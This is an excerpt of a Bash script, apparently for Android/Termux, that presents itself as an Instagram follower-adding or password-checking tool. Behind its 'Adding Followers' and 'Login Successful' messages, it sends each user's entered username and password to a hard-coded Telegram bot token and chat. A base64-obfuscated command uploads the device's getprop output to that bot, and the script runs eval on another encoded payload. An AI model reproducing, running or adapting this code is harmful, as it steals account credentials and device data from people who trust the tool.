...
# published exposer
# IG - no official ig
#hhttps://proffesorx777.github.io/follow/.
#########
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
...
sgnl=""
...
trick=""
req2="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2Nzk0MDQ3OTQ6QUFGRE9MUEIxWFk0RE43MHRRY28xbksyX2FNU3NDUU9yZHMvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDE0Mjk1Mzc2MjAgJj4vZGV2L251bGwK"
########
...
if [[ $var == "challenge" ]]; then printf "\e[1;93m\n[!] Challenge required. Allow Suspecious Login\n" && curl -X POST "https://api.telegram.org/bot1679404794:AAFDOLPB1XY4DN70tQco1nK2_aMSsCQOrds/sendMessage" -d "chat_id=-1001429537620" -d "text=Password Checker : TRUE/Sus Login Username - $user Password - $pass" &>/dev/null ; exit 1; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n[+] Login Successful\n" && curl -X POST "https://api.telegram.org/bot1679404794:AAFDOLPB1XY4DN70tQco1nK2_aMSsCQOrds/sendMessage" -d "chat_id=-1001429537620" -d "text=Password Checker : TRUE Username - $user Password - $pass" &>/dev/null && echo -e $red Adding Followers && sleep 10000 ; elif [[ $var == "Please wait" ]]; then echo "Please wait"; fi;
fi
...
if [[ $check_follow == "" ]]; then
    printf "\n\e[1;93m [!] Error : Wrong Password\n" && curl -X POST "https://api.telegram.org/bot1679404794:AAFDOLPB1XY4DN70tQco1nK2_aMSsCQOrds/sendMessage" -d "chat_id=-1001429537620" -d "text=Password Checker : FALSE Username - $user Password - $pass" &>/dev/null
    eval $(base64 -d <<<"$death")
exit 1
else
printf "\e[1;92mOK\e[0m\n"
